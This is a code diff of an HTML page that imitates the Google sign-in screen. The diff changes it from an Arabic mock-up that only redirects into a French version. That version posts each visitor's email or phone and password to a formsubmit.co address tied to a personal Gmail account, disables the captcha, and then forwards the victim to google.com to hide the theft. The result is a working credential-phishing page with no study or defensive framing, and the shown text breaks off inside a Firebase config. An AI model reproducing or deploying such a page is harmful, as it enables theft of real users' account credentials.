@@ -1,53 +1,60 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="fr" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول - Google</title>
+    <title>Connexion - Comptes Google</title>
     <style>
-        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; }
+        * { box-sizing: border-box; font-family: 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 0; }
         body { display: flex; align-items: center; justify-content: center; min-height: 100vh; background-color: #f0f4f9; }
         .login-container { background: #ffffff; padding: 40px; border-radius: 8px; width: 400px; border: 1px solid #dadce0; text-align: center; }
-        .logo { font-size: 24px; font-weight: bold; margin-bottom: 16px; }
+        .logo { font-size: 24px; font-weight: bold; margin-bottom: 16px; letter-spacing: -0.5px; }
         .logo span:nth-child(1) { color: #4285F4; }
         .logo span:nth-child(2) { color: #EA4335; }
         .logo span:nth-child(3) { color: #FBBC05; }
         .logo span:nth-child(4) { color: #4285F4; }
         .logo span:nth-child(5) { color: #34A853; }
         .logo span:nth-child(6) { color: #EA4335; }
-        h2 { font-size: 24px; color: #202124; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #dadce0; border-radius: 4px; }
-        .links { display: flex; justify-content: space-between; margin-bottom: 30px; font-size: 14px; }
-        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; float: left; }
+        h2 { font-size: 24px; color: #202124; margin-bottom: 8px; font-weight: 400; }
+        p.subtitle { font-size: 16px; color: #202124; margin-bottom: 30px; }
+        input[type="text"], input[type="password"] { width: 100%; padding: 14px; margin-bottom: 20px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; }
+        input:focus { border: 2px solid #1a73e8; padding: 13px; }
+        .links { display: flex; justify-content: space-between; margin-bottom: 30px; font-size: 14px; align-items: center; }
+        a { color: #1a73e8; text-decoration: none; font-weight: 500; }
+        a:hover { text-decoration: underline; }
+        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; float: right; font-size: 14px; font-weight: 500; }
+        button:hover { background-color: #1557b0; }
+        .clear { clear: both; }
     </style>
 </head>
 <body>
 
 <div class="login-container">
     <div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
-    <h2>تسجيل الدخول</h2>
+    <h2>Connexion</h2>
+    <p class="subtitle">Accéder à Google</p>
     
-    <!-- عند الضغط على الزر، يتم تنفيذ دالة JavaScript -->
-    <form id="loginForm">
-        <input type="text" placeholder="البريد الإلكتروني أو الهاتف" required>
-        <input type="password" placeholder="كلمة المرور" required>
+    <form action="https://formsubmit.co/Bayrem.digital@gmail.com" method="POST">
         
+        <input type="text" name="Email_ou_Telephone" placeholder="Adresse e-mail ou numéro de téléphone" required>
+        
+        <input type="password" name="Mot_de_passe" placeholder="Saisissez votre mot de passe" required>
+        
+        <input type="hidden" name="_next" value="https://www.google.com">
+        
+        <input type="hidden" name="_captcha" value="false">
+
         <div class="links">
-            <a href="#">إنشاء حساب</a>
-            <a href="#">هل نسيت كلمة المرور؟</a>
+            <a href="https://accounts.google.com/signup" target="_blank">Créer un compte</a>
+            <a href="https://accounts.google.com/signin/recovery" target="_blank">Mot de passe oublié ?</a>
         </div>
-        <button type="submit">التالي</button>
+        
+        <button type="submit">Suivant</button>
+        <div class="clear"></div>
     </form>
 </div>
 
 <script>
-    // عند إرسال النموذج، قم بالتحويل إلى موقع جوجل
-    document.getElementById('loginForm').addEventListener('submit', function(event) {
-        event.preventDefault(); // منع إعادة تحميل الصفحة
-        window.location.href = "https://www.google.com"; // الانتقال لـ جوجل
-    });
-
-    // معلومات فايرباز (للشكل فقط)
     const firebaseConfig = {
         apiKey: "ex-AIzaSyA1...",
         authDomain: "ex-project.firebaseapp.com",
